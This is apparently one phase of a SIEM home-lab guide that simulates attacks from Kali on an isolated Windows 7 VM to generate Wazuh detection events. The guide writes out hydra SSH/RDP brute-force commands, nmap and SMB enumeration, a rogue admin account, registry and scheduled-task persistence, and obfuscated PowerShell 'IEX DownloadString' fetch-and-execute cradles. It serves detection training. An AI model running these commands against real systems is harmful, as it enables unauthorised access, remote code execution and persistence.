# PHASE 4: Attack Simulation (Controlled)

## Overview

This phase simulates controlled security attacks from Kali Linux targeting Windows 7. All attacks are safe, controlled, and designed to generate security events for detection.

---

## ⚠️ IMPORTANT SAFETY WARNINGS

- ✅ **ONLY use EICAR test files** for malware simulation
- ✅ **NO real malware** in this lab environment
- ✅ **Isolated network** - all attacks stay within lab
- ✅ **Documented attacks** - all activities are logged
- ✅ **Controlled environment** - attacks are intentional and monitored

---

## Objectives

1. ✅ Simulate SSH brute-force attacks
2. ✅ Simulate RDP failed login attempts
3. ✅ Test malware detection using EICAR
4. ✅ Simulate privilege escalation attempts
5. ✅ Generate suspicious PowerShell execution events

---

## Prerequisites

- [ ] Phase 3 complete (Log collection working)
- [ ] Windows 7 VM powered on
- [ ] Kali Linux VM powered on
- [ ] RDP enabled on Windows 7 (optional, for testing)
- [ ] All logs flowing to SIEM

---

## Part 1: SSH Brute-Force Attack

### Step 1.1: Enable SSH on Windows 7 (Optional)

**Note:** If SSH is not enabled, we can simulate this using other services or skip to RDP brute-force.

**Enable OpenSSH on Windows 7 (if available):**

```cmd
# On Windows 7 (if Windows 10 or newer)
# Add OpenSSH Server feature
```

**Or simulate SSH brute-force on Kali's own SSH service (safer for lab):**

We'll target Kali's SSH from Windows 7 (reverse scenario) or document the technique.

### Step 1.2: Execute SSH Brute-Force from Kali

**Install Hydra (if not present):**

```bash
# On Kali Linux
sudo apt update
sudo apt install -y hydra
```

**Create password wordlist:**

```bash
# On Kali Linux
cd ~
cat > passwords.txt << EOF
password
Password
Password123
admin
Admin
123456
qwerty
letmein
welcome
EOF
```

**Execute Brute-Force Attack:**

```bash
# Target: Windows 7 (if SSH enabled) or SIEM Server
# Replace with appropriate target IP

# Example: Attack Windows 7 SSH (if enabled)
hydra -l administrator -P passwords.txt ssh://192.168.56.20

# Example: Attack SIEM Server SSH
hydra -l root -P passwords.txt ssh://192.168.56.10

# Use verbose mode for more logging
hydra -l administrator -P passwords.txt -v -t 4 ssh://192.168.56.20

# For controlled testing, limit attempts:
hydra -l administrator -P passwords.txt -t 2 -w 5 ssh://192.168.56.20
```

**Expected Logs:**
- Multiple failed SSH login attempts
- Auth log entries on target
- Wazuh alerts for brute-force detection

---

## Part 2: RDP Brute-Force Attack

### Step 2.1: Enable RDP on Windows 7

**On Windows 7:**

```cmd
# Enable Remote Desktop
sysdm.cpl
# Or via PowerShell:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### Step 2.2: Execute RDP Brute-Force

**Install RDP attack tool on Kali:**

```bash
# Install Hydra (already done) or use other tools
# Hydra supports RDP
```

**Create username wordlist:**

```bash
# On Kali Linux
cat > usernames.txt << EOF
administrator
admin
user
guest
test
EOF
```

**Execute RDP Brute-Force:**

```bash
# Attack Windows 7 RDP
hydra -L usernames.txt -P passwords.txt -t 4 rdp://192.168.56.20

# More controlled (slower, more logging):
hydra -L usernames.txt -P passwords.txt -t 2 -w 5 -v rdp://192.168.56.20
```

**Expected Logs:**
- Windows Security Event Log 4625 (Failed logon)
- Multiple failed authentication attempts
- Wazuh alerts for brute-force

---

## Part 3: Malware Detection (EICAR Test File)

### Step 3.1: Create EICAR Test File

**EICAR is a safe test file that simulates malware for testing antivirus/EDR.**

**On Windows 7, create EICAR file:**

```cmd
# Using PowerShell
powershell -Command "[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=')) | Out-File -FilePath C:\eicar.com -Encoding ASCII"
```

**Or create manually:**

```cmd
# Create eicar.txt with this content:
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

### Step 3.2: Trigger Detection

**Actions to trigger detection:**

```cmd
# Download EICAR from internet (if NAT enabled temporarily)
# Or copy file to Windows 7

# Execute the file (will trigger Windows Defender or Wazuh)
C:\eicar.com

# Or scan with PowerShell
powershell -Command "Get-Content C:\eicar.com"
```

**Expected Logs:**
- Windows Defender alert (if enabled)
- Sysmon process creation event
- Wazuh file hash detection alert

### Step 3.3: Create Known Malware Hash Detection

**Calculate file hash:**

```cmd
# On Windows 7
certutil -hashfile C:\eicar.com MD5
certutil -hashfile C:\eicar.com SHA256
```

**Note the hash for use in detection rules (Phase 5).**

---

## Part 4: Privilege Escalation Simulation

### Step 4.1: Create New Admin User (Simulate Privilege Escalation)

**On Windows 7:**

```cmd
# Create suspicious admin account
net user hacker Password123 /add
net localgroup administrators hacker /add
```

**Expected Logs:**
- Windows Security Event 4728 (Member added to security-enabled global group)
- Windows Security Event 4720 (User account created)
- Sysmon process creation for net.exe

### Step 4.2: Access Attempts from Non-Admin Account

**Create regular user and attempt privilege escalation:**

```cmd
# Create regular user
net user lowprivuser Test123 /add

# Log in as low privilege user (if RDP available)
# Attempt to run admin commands
```

### Step 4.3: UAC Bypass Simulation

**Attempt to bypass UAC:**

```cmd
# Simulate UAC bypass attempt
# This is for logging purposes only
powershell -Command "Start-Process cmd -Verb RunAs"
```

**Expected Logs:**
- UAC elevation prompts
- Process creation events
- Security log entries

---

## Part 5: Suspicious PowerShell Execution

### Step 5.1: Enable PowerShell Logging

**Verify PowerShell logging is enabled:**

```cmd
# Check PowerShell logging
Get-WinEvent -ListLog "Microsoft-Windows-PowerShell*"

# Enable PowerShell script block logging (if not enabled)
# This should be enabled via Group Policy or manually
```

### Step 5.2: Execute Suspicious PowerShell Commands

**Base64 Encoded Commands (Common Technique):**

```powershell
# On Windows 7, run suspicious PowerShell
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAGcAbwBvAGcAbABlAC4AYwBvAG0A

# Decode to see what it does (base64)
# Should be: Invoke-WebRequest -Uri https://www.google.com
```

**Obfuscated PowerShell:**

```powershell
# Execute obfuscated PowerShell
powershell -Command "$x='iex'; $y='(New-Object Net.WebClient).DownloadString(''http://example.com/script.ps1'')'; & $x $y"
```

**Suspicious Activity:**

```powershell
# Download and execute script (simulated)
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.30/test.ps1')"

# Create suspicious network connections
Test-NetConnection -ComputerName 192.168.56.30 -Port 4444

# Suspicious registry modifications
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Suspicious" -Value "malware.exe"
```

**Expected Logs:**
- PowerShell script block logging events
- Process creation for powershell.exe
- Network connection events
- Registry modification events

---

## Part 6: Lateral Movement Simulation

### Step 6.1: Network Scanning from Kali

**Perform network scan:**

```bash
# On Kali Linux
# Scan Windows 7
nmap -sS -p- 192.168.56.20

# Service enumeration
nmap -sV -p 135,139,445,3389 192.168.56.20

# Aggressive scan
nmap -A 192.168.56.20
```

**Expected Logs:**
- Network connection events on Windows 7
- Firewall logs
- Sysmon network events

### Step 6.2: SMB Enumeration

**Attempt SMB enumeration:**

```bash
# On Kali Linux
# Enumerate SMB shares
smbclient -L //192.168.56.20 -N

# Attempt null session
smbclient //192.168.56.20/ipc$ -N
```

**Expected Logs:**
- SMB connection attempts
- Failed authentication events
- Network protocol logs

---

## Part 7: Data Exfiltration Simulation

### Step 7.1: Create Sensitive File

**On Windows 7:**

```cmd
# Create "sensitive" file
echo This is sensitive data > C:\Users\Public\sensitive.txt
```

### Step 7.2: Simulate Data Exfiltration

**From Kali, attempt to access file:**

```bash
# If SMB access available, copy file
# Or simulate via network transfer
```

**On Windows 7, simulate data transfer:**

```powershell
# Simulate data exfiltration via PowerShell
$data = Get-Content C:\Users\Public\sensitive.txt
$bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
$base64 = [System.Convert]::ToBase64String($bytes)

# Simulate sending to external server (won't actually send)
Test-NetConnection -ComputerName 192.168.56.30 -Port 4444
```

**Expected Logs:**
- File access events
- Network connection events
- Process creation for data transfer tools

---

## Part 8: Persistence Mechanisms

### Step 8.1: Create Startup Persistence

**On Windows 7:**

```cmd
# Add to startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TestPersist" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

### Step 8.2: Create Scheduled Task

**On Windows 7:**

```cmd
# Create scheduled task
schtasks /create /tn "TestTask" /tr "C:\Windows\System32\calc.exe" /sc minute /mo 5 /f
```

**Expected Logs:**
- Registry modification events
- Scheduled task creation events
- Process execution events

---

## Validation and Verification

### Step 9.1: Verify Events in Wazuh

**Check Wazuh Manager logs:**

```bash
# On SIEM Server
sudo tail -f /var/ossec/logs/ossec.log | grep -i "attack\|brute\|malware\|privilege"
```

### Step 9.2: Verify in Kibana

**Access Kibana:**

1. Navigate to: `http://192.168.56.10:5601`
2. Go to: **Wazuh** → **Discover**
3. Filter by attack types:
   - `rule.description: "brute"`
   - `rule.description: "malware"`
   - `rule.description: "privilege"`
4. Review timeline of events

### Step 9.3: Document Attack Timeline

**Create attack timeline:**

1. Note timestamp of each attack
2. Document which attacks generated alerts
3. Note false negatives (attacks not detected)

---

## Attack Summary Table

| Attack Type | Command/Tool | Target | Expected Logs | Detection |
|-------------|-------------|--------|---------------|-----------|
| SSH Brute-Force | `hydra` | SIEM/Kali SSH | Auth failures | Event 4625 |
| RDP Brute-Force | `hydra` | Windows 7 | Failed logons | Event 4625 |
| Malware (EICAR) | File creation | Windows 7 | File hash | Defender/Sysmon |
| Privilege Escalation | `net user` | Windows 7 | User creation | Event 4720/4728 |
| PowerShell Obfuscation | Base64 encoded | Windows 7 | Script block logs | PowerShell logs |
| Network Scanning | `nmap` | Windows 7 | Network connections | Sysmon |
| Data Exfiltration | PowerShell | Windows 7 | File access | File events |
| Persistence | Registry/Task | Windows 7 | Registry changes | Registry events |

---

## Safety Reminders

⚠️ **CRITICAL SAFETY RULES:**

1. ✅ **ONLY EICAR test files** - Never use real malware
2. ✅ **Isolated network** - All attacks stay within 192.168.56.0/24
3. ✅ **Controlled environment** - All attacks are intentional
4. ✅ **Document everything** - Keep logs of all activities
5. ✅ **No production systems** - This is a lab environment only

---

## Next Steps

**Phase 4 Status**: ✅ **COMPLETE**

**Ready for**: Phase 5 - Detection Engineering

After Phase 5, you'll create detection rules to automatically detect these attack patterns.

---

**Phase 4 Documentation Complete**

